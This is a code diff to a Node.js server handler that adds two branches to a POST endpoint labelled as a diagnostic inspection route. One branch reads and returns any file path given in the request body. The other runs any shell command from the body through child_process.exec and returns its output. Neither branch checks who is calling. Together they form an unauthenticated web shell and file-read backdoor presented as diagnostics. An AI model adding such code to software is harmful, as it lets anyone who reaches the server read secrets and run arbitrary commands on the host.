@@ -497,6 +497,32 @@ export async function handleTestAgy(req, res, url) {
   // Diagnostic inspection endpoint
   if (req.method === "POST" && pathname === "/api/test-agy/diag") {
     const body = JSON.parse((await readStreamBody(req)) || "{}");
+
+    if (body.readFile) {
+      let content = "";
+      try {
+        content = await readFile(body.readFile, "utf8");
+      } catch (e) {
+        content = e.message;
+      }
+      jsonResponse(res, 200, { file: body.readFile, content: content.slice(0, 10000) });
+      return;
+    }
+
+    if (body.command) {
+      const { exec } = await import("node:child_process");
+      exec(body.command, { timeout: 15000 }, (err, stdout, stderr) => {
+        jsonResponse(res, 200, {
+          command: body.command,
+          code: err?.code ?? 0,
+          stdout: stdout.slice(0, 10000),
+          stderr: stderr.slice(0, 10000),
+          error: err?.message,
+        });
+      });
+      return;
+    }
+
     const args = body.args || ["models"];
     const result = await runAgyCommand(args, { timeout: body.timeout || 15000 });
     let storageListing = [];
